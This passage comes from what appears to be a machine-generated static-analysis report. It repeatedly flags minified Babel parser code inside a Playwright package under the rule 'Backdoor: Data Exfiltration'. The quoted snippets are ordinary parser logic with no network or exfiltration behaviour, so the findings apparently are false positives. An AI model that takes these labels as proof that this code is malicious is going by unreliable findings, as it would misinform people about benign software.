                    "text": "return!0;if(!r&&n>1){for(let s=0;s<n-1;s++)if(this.importsStack[s].has(t))return!0}return!1}declareName(t,r,n){if(r&4096){this.hasImport(t,!0)&&this.parser.raise(k.VarRedeclaration,n,{identifierName:t}),this.importsStack[this.importsStack.length-1].add(t);return}let s=this.currentScope(),i=s.tsNames.get(t)||0;if(r&1024){this.maybeExportDefined(s,t),s.tsNames.set(t,i|16);return}super.declareName(t,r,n),r&2&&(r&1||(this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t)),i=i|1),r&256&&(i=i|2),r&512&&(i=i|4),r&128&&(i=i|8),i&&s.tsNames.set(t,i)}isRedeclaredInScope(t,r,n){let s=t.tsNames.g",
                    "rendered": {
                      "text": "return!0;if(!r&&n>1){for(let s=0;s<n-1;s++)if(this.importsStack[s].has(t))return!0}return!1}declareName(t,r,n){if(r&4096){this.hasImport(t,!0)&&this.parser.raise(k.VarRedeclaration,n,{identifierName:t}),this.importsStack[this.importsStack.length-1].add(t);return}let s=this.currentScope(),i=s.tsNames.get(t)||0;if(r&1024){this.maybeExportDefined(s,t),s.tsNames.set(t,i|16);return}super.declareName(t,r,n),r&2&&(r&1||(this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t)),i=i|1),r&256&&(i=i|2),r&512&&(i=i|4),r&128&&(i=i|8),i&&s.tsNames.set(t,i)}isRedeclaredInScope(t,r,n){let s=t.tsNames.g",
                      "markdown": "`return!0;if(!r&&n>1){for(let s=0;s<n-1;s++)if(this.importsStack[s].has(t))return!0}return!1}declareName(t,r,n){if(r&4096){this.hasImport(t,!0)&&this.parser.raise(k.VarRedeclaration,n,{identifierName:t}),this.importsStack[this.importsStack.length-1].add(t);return}let s=this.currentScope(),i=s.tsNames.get(t)||0;if(r&1024){this.maybeExportDefined(s,t),s.tsNames.set(t,i|16);return}super.declareName(t,r,n),r&2&&(r&1||(this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t)),i=i|1),r&256&&(i=i|2),r&512&&(i=i|4),r&128&&(i=i|8),i&&s.tsNames.set(t,i)}isRedeclaredInScope(t,r,n){let s=t.tsNames.g`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 20784,
                  "endLine": 27,
                  "endColumn": 20789,
                  "snippet": {
                    "text": ".from(t.undefinedPrivateNames))r?r.undefinedPrivateNames.has(n)||r.undefinedPrivateNames.set(n,s):this.parser.raise(k.InvalidPrivateFieldResolution,s,{identifierName:n})}declarePrivateName(t,r,n){let{privateNames:s,loneAccessors:i,undefinedPrivateNames:a}=this.current(),o=s.has(t);if(r&3){let l=o&&i.get(t);if(l){let u=l&4,c=r&4,f=l&3,p=r&3;o=f===p||u!==c,o||i.delete(t)}else o||i.set(t,r)}o&&this.parser.raise(k.PrivateNameRedeclaration,n,{identifierName:t}),s.add(t),a.delete(t)}usePrivateName(t,r){let n;for(n of this.stack)if(n.privateNames.has(t))return;n?n.undefinedPrivateNames.set(t,r):this.parse",
                    "rendered": {
                      "text": ".from(t.undefinedPrivateNames))r?r.undefinedPrivateNames.has(n)||r.undefinedPrivateNames.set(n,s):this.parser.raise(k.InvalidPrivateFieldResolution,s,{identifierName:n})}declarePrivateName(t,r,n){let{privateNames:s,loneAccessors:i,undefinedPrivateNames:a}=this.current(),o=s.has(t);if(r&3){let l=o&&i.get(t);if(l){let u=l&4,c=r&4,f=l&3,p=r&3;o=f===p||u!==c,o||i.delete(t)}else o||i.set(t,r)}o&&this.parser.raise(k.PrivateNameRedeclaration,n,{identifierName:t}),s.add(t),a.delete(t)}usePrivateName(t,r){let n;for(n of this.stack)if(n.privateNames.has(t))return;n?n.undefinedPrivateNames.set(t,r):this.parse",
                      "markdown": "`.from(t.undefinedPrivateNames))r?r.undefinedPrivateNames.has(n)||r.undefinedPrivateNames.set(n,s):this.parser.raise(k.InvalidPrivateFieldResolution,s,{identifierName:n})}declarePrivateName(t,r,n){let{privateNames:s,loneAccessors:i,undefinedPrivateNames:a}=this.current(),o=s.has(t);if(r&3){let l=o&&i.get(t);if(l){let u=l&4,c=r&4,f=l&3,p=r&3;o=f===p||u!==c,o||i.delete(t)}else o||i.set(t,r)}o&&this.parser.raise(k.PrivateNameRedeclaration,n,{identifierName:t}),s.add(t),a.delete(t)}usePrivateName(t,r){let n;for(n of this.stack)if(n.privateNames.has(t))return;n?n.undefinedPrivateNames.set(t,r):this.parse`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 19073,
                  "endLine": 27,
                  "endColumn": 19078,
                  "snippet": {
                    "text": "this.state.curPosition()),s=this.state.pos-1;continue}++this.state.pos;let l=this.readCodePoint(!0);l!==null&&(o(l)||this.raise(k.EscapedCharNotAnIdentifier,a),r+=String.fromCodePoint(l)),s=this.state.pos}else break}return r+this.input.slice(s,this.state.pos)}readWord(t){let r=this.readWord1(t),n=Oy.get(r);n!==void 0?this.finishToken(n,bs(n)):this.finishToken(132,r)}checkKeywordEscapes(){let{type:t}=this.state;jy(t)&&this.state.containsEsc&&this.raise(k.InvalidEscapedReservedWord,this.state.startLoc,{reservedWord:bs(t)})}raise(t,r,n={}){let s=r instanceof yn?r:r.loc.start,i=t(s,n);if(!this.options.",
                    "rendered": {
                      "text": "this.state.curPosition()),s=this.state.pos-1;continue}++this.state.pos;let l=this.readCodePoint(!0);l!==null&&(o(l)||this.raise(k.EscapedCharNotAnIdentifier,a),r+=String.fromCodePoint(l)),s=this.state.pos}else break}return r+this.input.slice(s,this.state.pos)}readWord(t){let r=this.readWord1(t),n=Oy.get(r);n!==void 0?this.finishToken(n,bs(n)):this.finishToken(132,r)}checkKeywordEscapes(){let{type:t}=this.state;jy(t)&&this.state.containsEsc&&this.raise(k.InvalidEscapedReservedWord,this.state.startLoc,{reservedWord:bs(t)})}raise(t,r,n={}){let s=r instanceof yn?r:r.loc.start,i=t(s,n);if(!this.options.",
                      "markdown": "`this.state.curPosition()),s=this.state.pos-1;continue}++this.state.pos;let l=this.readCodePoint(!0);l!==null&&(o(l)||this.raise(k.EscapedCharNotAnIdentifier,a),r+=String.fromCodePoint(l)),s=this.state.pos}else break}return r+this.input.slice(s,this.state.pos)}readWord(t){let r=this.readWord1(t),n=Oy.get(r);n!==void 0?this.finishToken(n,bs(n)):this.finishToken(132,r)}checkKeywordEscapes(){let{type:t}=this.state;jy(t)&&this.state.containsEsc&&this.raise(k.InvalidEscapedReservedWord,this.state.startLoc,{reservedWord:bs(t)})}raise(t,r,n={}){let s=r instanceof yn?r:r.loc.start,i=t(s,n);if(!this.options.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 39981,
                  "endLine": 25,
                  "endColumn": 39986,
                  "snippet": {
                    "text": "SM=!1,this.ambiguousScriptDifferentAst=!1}hasPlugin(t){if(typeof t==\"string\")return this.plugins.has(t);{let[r,n]=t;if(!this.hasPlugin(r))return!1;let s=this.plugins.get(r);for(let i of Object.keys(n))if((s==null?void 0:s[i])!==n[i])return!1;return!0}}getPluginOption(t,r){var n;return(n=this.plugins.get(t))==null?void 0:n[r]}};function sA(e,t){e.trailingComments===void 0?e.trailingComments=t:e.trailingComments.unshift(...t)}function Lse(e,t){e.leadingComments===void 0?e.leadingComments=t:e.leadingComments.unshift(...t)}function Po(e,t){e.innerComments===void 0?e.innerComments=t:e.innerComments.unsh",
                    "rendered": {
                      "text": "SM=!1,this.ambiguousScriptDifferentAst=!1}hasPlugin(t){if(typeof t==\"string\")return this.plugins.has(t);{let[r,n]=t;if(!this.hasPlugin(r))return!1;let s=this.plugins.get(r);for(let i of Object.keys(n))if((s==null?void 0:s[i])!==n[i])return!1;return!0}}getPluginOption(t,r){var n;return(n=this.plugins.get(t))==null?void 0:n[r]}};function sA(e,t){e.trailingComments===void 0?e.trailingComments=t:e.trailingComments.unshift(...t)}function Lse(e,t){e.leadingComments===void 0?e.leadingComments=t:e.leadingComments.unshift(...t)}function Po(e,t){e.innerComments===void 0?e.innerComments=t:e.innerComments.unsh",
                      "markdown": "`SM=!1,this.ambiguousScriptDifferentAst=!1}hasPlugin(t){if(typeof t==\"string\")return this.plugins.has(t);{let[r,n]=t;if(!this.hasPlugin(r))return!1;let s=this.plugins.get(r);for(let i of Object.keys(n))if((s==null?void 0:s[i])!==n[i])return!1;return!0}}getPluginOption(t,r){var n;return(n=this.plugins.get(t))==null?void 0:n[r]}};function sA(e,t){e.trailingComments===void 0?e.trailingComments=t:e.trailingComments.unshift(...t)}function Lse(e,t){e.leadingComments===void 0?e.leadingComments=t:e.leadingComments.unshift(...t)}function Po(e,t){e.innerComments===void 0?e.innerComments=t:e.innerComments.unsh`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 39846,
                  "endLine": 25,
                  "endColumn": 39851,
                  "snippet": {
                    "text": "LocalExport(t){this.scopeStack[0].declareFunctions.has(t.name)||super.checkLocalExport(t)}},hy=class{constructor(){this.sawUnambiguousESM=!1,this.ambiguousScriptDifferentAst=!1}hasPlugin(t){if(typeof t==\"string\")return this.plugins.has(t);{let[r,n]=t;if(!this.hasPlugin(r))return!1;let s=this.plugins.get(r);for(let i of Object.keys(n))if((s==null?void 0:s[i])!==n[i])return!1;return!0}}getPluginOption(t,r){var n;return(n=this.plugins.get(t))==null?void 0:n[r]}};function sA(e,t){e.trailingComments===void 0?e.trailingComments=t:e.trailingComments.unshift(...t)}function Lse(e,t){e.leadingComments===void",
                    "rendered": {
                      "text": "LocalExport(t){this.scopeStack[0].declareFunctions.has(t.name)||super.checkLocalExport(t)}},hy=class{constructor(){this.sawUnambiguousESM=!1,this.ambiguousScriptDifferentAst=!1}hasPlugin(t){if(typeof t==\"string\")return this.plugins.has(t);{let[r,n]=t;if(!this.hasPlugin(r))return!1;let s=this.plugins.get(r);for(let i of Object.keys(n))if((s==null?void 0:s[i])!==n[i])return!1;return!0}}getPluginOption(t,r){var n;return(n=this.plugins.get(t))==null?void 0:n[r]}};function sA(e,t){e.trailingComments===void 0?e.trailingComments=t:e.trailingComments.unshift(...t)}function Lse(e,t){e.leadingComments===void",
                      "markdown": "`LocalExport(t){this.scopeStack[0].declareFunctions.has(t.name)||super.checkLocalExport(t)}},hy=class{constructor(){this.sawUnambiguousESM=!1,this.ambiguousScriptDifferentAst=!1}hasPlugin(t){if(typeof t==\"string\")return this.plugins.has(t);{let[r,n]=t;if(!this.hasPlugin(r))return!1;let s=this.plugins.get(r);for(let i of Object.keys(n))if((s==null?void 0:s[i])!==n[i])return!1;return!0}}getPluginOption(t,r){var n;return(n=this.plugins.get(t))==null?void 0:n[r]}};function sA(e,t){e.trailingComments===void 0?e.trailingComments=t:e.trailingComments.unshift(...t)}function Lse(e,t){e.leadingComments===void`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 39501,
                  "endLine": 25,
                  "endColumn": 39506,
                  "snippet": {
                    "text": "Name(t,r,n){let s=this.currentScope();if(r&2048){this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t),s.declareFunctions.add(t);return}super.declareName(t,r,n)}isRedeclaredInScope(t,r,n){if(super.isRedeclaredInScope(t,r,n))return!0;if(n&2048&&!t.declareFunctions.has(r)){let s=t.names.get(r);return(s&4)>0||(s&2)>0}return!1}checkLocalExport(t){this.scopeStack[0].declareFunctions.has(t.name)||super.checkLocalExport(t)}},hy=class{constructor(){this.sawUnambiguousESM=!1,this.ambiguousScriptDifferentAst=!1}hasPlugin(t){if(typeof t==\"string\")return this.plugins.has(t);{let[r,n]=t;if(!this.",
                    "rendered": {
                      "text": "Name(t,r,n){let s=this.currentScope();if(r&2048){this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t),s.declareFunctions.add(t);return}super.declareName(t,r,n)}isRedeclaredInScope(t,r,n){if(super.isRedeclaredInScope(t,r,n))return!0;if(n&2048&&!t.declareFunctions.has(r)){let s=t.names.get(r);return(s&4)>0||(s&2)>0}return!1}checkLocalExport(t){this.scopeStack[0].declareFunctions.has(t.name)||super.checkLocalExport(t)}},hy=class{constructor(){this.sawUnambiguousESM=!1,this.ambiguousScriptDifferentAst=!1}hasPlugin(t){if(typeof t==\"string\")return this.plugins.has(t);{let[r,n]=t;if(!this.",
                      "markdown": "`Name(t,r,n){let s=this.currentScope();if(r&2048){this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t),s.declareFunctions.add(t);return}super.declareName(t,r,n)}isRedeclaredInScope(t,r,n){if(super.isRedeclaredInScope(t,r,n))return!0;if(n&2048&&!t.declareFunctions.has(r)){let s=t.names.get(r);return(s&4)>0||(s&2)>0}return!1}checkLocalExport(t){this.scopeStack[0].declareFunctions.has(t.name)||super.checkLocalExport(t)}},hy=class{constructor(){this.sawUnambiguousESM=!1,this.ambiguousScriptDifferentAst=!1}hasPlugin(t){if(typeof t==\"string\")return this.plugins.has(t);{let[r,n]=t;if(!this.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 38481,
                  "endLine": 25,
                  "endColumn": 38486,
                  "snippet": {
                    "text": "eExportDefined(t,r){this.parser.inModule&&t.flags&1&&this.undefinedExports.delete(r)}checkRedeclarationInScope(t,r,n,s){this.isRedeclaredInScope(t,r,n)&&this.parser.raise(k.VarRedeclaration,s,{identifierName:r})}isRedeclaredInScope(t,r,n){if(!(n&1))return!1;if(n&8)return t.names.has(r);let s=t.names.get(r);return n&16?(s&2)>0||!this.treatFunctionsAsVarInScope(t)&&(s&1)>0:(s&2)>0&&!(t.flags&8&&t.firstLexicalName===r)||!this.treatFunctionsAsVarInScope(t)&&(s&4)>0}checkLocalExport(t){let{name:r}=t;this.scopeStack[0].names.has(r)||this.undefinedExports.set(r,t.loc.start)}currentScope(){return this.scop",
                    "rendered": {
                      "text": "eExportDefined(t,r){this.parser.inModule&&t.flags&1&&this.undefinedExports.delete(r)}checkRedeclarationInScope(t,r,n,s){this.isRedeclaredInScope(t,r,n)&&this.parser.raise(k.VarRedeclaration,s,{identifierName:r})}isRedeclaredInScope(t,r,n){if(!(n&1))return!1;if(n&8)return t.names.has(r);let s=t.names.get(r);return n&16?(s&2)>0||!this.treatFunctionsAsVarInScope(t)&&(s&1)>0:(s&2)>0&&!(t.flags&8&&t.firstLexicalName===r)||!this.treatFunctionsAsVarInScope(t)&&(s&4)>0}checkLocalExport(t){let{name:r}=t;this.scopeStack[0].names.has(r)||this.undefinedExports.set(r,t.loc.start)}currentScope(){return this.scop",
                      "markdown": "`eExportDefined(t,r){this.parser.inModule&&t.flags&1&&this.undefinedExports.delete(r)}checkRedeclarationInScope(t,r,n,s){this.isRedeclaredInScope(t,r,n)&&this.parser.raise(k.VarRedeclaration,s,{identifierName:r})}isRedeclaredInScope(t,r,n){if(!(n&1))return!1;if(n&8)return t.names.has(r);let s=t.names.get(r);return n&16?(s&2)>0||!this.treatFunctionsAsVarInScope(t)&&(s&1)>0:(s&2)>0&&!(t.flags&8&&t.firstLexicalName===r)||!this.treatFunctionsAsVarInScope(t)&&(s&4)>0}checkLocalExport(t){let{name:r}=t;this.scopeStack[0].names.has(r)||this.undefinedExports.set(r,t.loc.start)}currentScope(){return this.scop`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 38047,
                  "endLine": 25,
                  "endColumn": 38052,
                  "snippet": {
                    "text": "clarationInScope(s,t,r,n);let i=s.names.get(t)||0;r&16?i=i|4:(s.firstLexicalName||(s.firstLexicalName=t),i=i|2),s.names.set(t,i),r&8&&this.maybeExportDefined(s,t)}else if(r&4)for(let i=this.scopeStack.length-1;i>=0&&(s=this.scopeStack[i],this.checkRedeclarationInScope(s,t,r,n),s.names.set(t,(s.names.get(t)||0)|1),this.maybeExportDefined(s,t),!(s.flags&387));--i);this.parser.inModule&&s.flags&1&&this.undefinedExports.delete(t)}maybeExportDefined(t,r){this.parser.inModule&&t.flags&1&&this.undefinedExports.delete(r)}checkRedeclarationInScope(t,r,n,s){this.isRedeclaredInScope(t,r,n)&&this.parser.raise(",
                    "rendered": {
                      "text": "clarationInScope(s,t,r,n);let i=s.names.get(t)||0;r&16?i=i|4:(s.firstLexicalName||(s.firstLexicalName=t),i=i|2),s.names.set(t,i),r&8&&this.maybeExportDefined(s,t)}else if(r&4)for(let i=this.scopeStack.length-1;i>=0&&(s=this.scopeStack[i],this.checkRedeclarationInScope(s,t,r,n),s.names.set(t,(s.names.get(t)||0)|1),this.maybeExportDefined(s,t),!(s.flags&387));--i);this.parser.inModule&&s.flags&1&&this.undefinedExports.delete(t)}maybeExportDefined(t,r){this.parser.inModule&&t.flags&1&&this.undefinedExports.delete(r)}checkRedeclarationInScope(t,r,n,s){this.isRedeclaredInScope(t,r,n)&&this.parser.raise(",
                      "markdown": "`clarationInScope(s,t,r,n);let i=s.names.get(t)||0;r&16?i=i|4:(s.firstLexicalName||(s.firstLexicalName=t),i=i|2),s.names.set(t,i),r&8&&this.maybeExportDefined(s,t)}else if(r&4)for(let i=this.scopeStack.length-1;i>=0&&(s=this.scopeStack[i],this.checkRedeclarationInScope(s,t,r,n),s.names.set(t,(s.names.get(t)||0)|1),this.maybeExportDefined(s,t),!(s.flags&387));--i);this.parser.inModule&&s.flags&1&&this.undefinedExports.delete(t)}maybeExportDefined(t,r){this.parser.inModule&&t.flags&1&&this.undefinedExports.delete(r)}checkRedeclarationInScope(t,r,n,s){this.isRedeclaredInScope(t,r,n)&&this.parser.raise(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 37786,
                  "endLine": 25,
                  "endColumn": 37791,
                  "snippet": {
                    "text": "ew So(t)}enter(t){this.scopeStack.push(this.createScope(t))}exit(){return this.scopeStack.pop().flags}treatFunctionsAsVarInScope(t){return!!(t.flags&130||!this.parser.inModule&&t.flags&1)}declareName(t,r,n){let s=this.currentScope();if(r&8||r&16){this.checkRedeclarationInScope(s,t,r,n);let i=s.names.get(t)||0;r&16?i=i|4:(s.firstLexicalName||(s.firstLexicalName=t),i=i|2),s.names.set(t,i),r&8&&this.maybeExportDefined(s,t)}else if(r&4)for(let i=this.scopeStack.length-1;i>=0&&(s=this.scopeStack[i],this.checkRedeclarationInScope(s,t,r,n),s.names.set(t,(s.names.get(t)||0)|1),this.maybeExportDefined(s,t),",
                    "rendered": {
                      "text": "ew So(t)}enter(t){this.scopeStack.push(this.createScope(t))}exit(){return this.scopeStack.pop().flags}treatFunctionsAsVarInScope(t){return!!(t.flags&130||!this.parser.inModule&&t.flags&1)}declareName(t,r,n){let s=this.currentScope();if(r&8||r&16){this.checkRedeclarationInScope(s,t,r,n);let i=s.names.get(t)||0;r&16?i=i|4:(s.firstLexicalName||(s.firstLexicalName=t),i=i|2),s.names.set(t,i),r&8&&this.maybeExportDefined(s,t)}else if(r&4)for(let i=this.scopeStack.length-1;i>=0&&(s=this.scopeStack[i],this.checkRedeclarationInScope(s,t,r,n),s.names.set(t,(s.names.get(t)||0)|1),this.maybeExportDefined(s,t),",
                      "markdown": "`ew So(t)}enter(t){this.scopeStack.push(this.createScope(t))}exit(){return this.scopeStack.pop().flags}treatFunctionsAsVarInScope(t){return!!(t.flags&130||!this.parser.inModule&&t.flags&1)}declareName(t,r,n){let s=this.currentScope();if(r&8||r&16){this.checkRedeclarationInScope(s,t,r,n);let i=s.names.get(t)||0;r&16?i=i|4:(s.firstLexicalName||(s.firstLexicalName=t),i=i|2),s.names.set(t,i),r&8&&this.maybeExportDefined(s,t)}else if(r&4)for(let i=this.scopeStack.length-1;i>=0&&(s=this.scopeStack[i],this.checkRedeclarationInScope(s,t,r,n),s.names.set(t,(s.names.get(t)||0)|1),this.maybeExportDefined(s,t),`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 855,
                  "endLine": 20,
                  "endColumn": 860,
                  "snippet": {
                    "text": "=Zne(Jm(),!0);function NP(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(NP=function(n){return n?r:t})(e)}function Zne(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=NP(t);if(r&&r.has(e))return r.get(e);var n={__proto__:null},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n",
                    "rendered": {
                      "text": "=Zne(Jm(),!0);function NP(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(NP=function(n){return n?r:t})(e)}function Zne(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=NP(t);if(r&&r.has(e))return r.get(e);var n={__proto__:null},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n",
                      "markdown": "`=Zne(Jm(),!0);function NP(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(NP=function(n){return n?r:t})(e)}function Zne(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=NP(t);if(r&&r.has(e))return r.get(e);var n={__proto__:null},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 4726,
                  "endLine": 19,
                  "endColumn": 4731,
                  "snippet": {
                    "text": "=Kne(Jm(),!0);function xP(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(xP=function(n){return n?r:t})(e)}function Kne(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=xP(t);if(r&&r.has(e))return r.get(e);var n={__proto__:null},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n",
                    "rendered": {
                      "text": "=Kne(Jm(),!0);function xP(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(xP=function(n){return n?r:t})(e)}function Kne(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=xP(t);if(r&&r.has(e))return r.get(e);var n={__proto__:null},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n",
                      "markdown": "`=Kne(Jm(),!0);function xP(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(xP=function(n){return n?r:t})(e)}function Kne(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=xP(t);if(r&&r.has(e))return r.get(e);var n={__proto__:null},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 229,
                  "endLine": 19,
                  "endColumn": 234,
                  "snippet": {
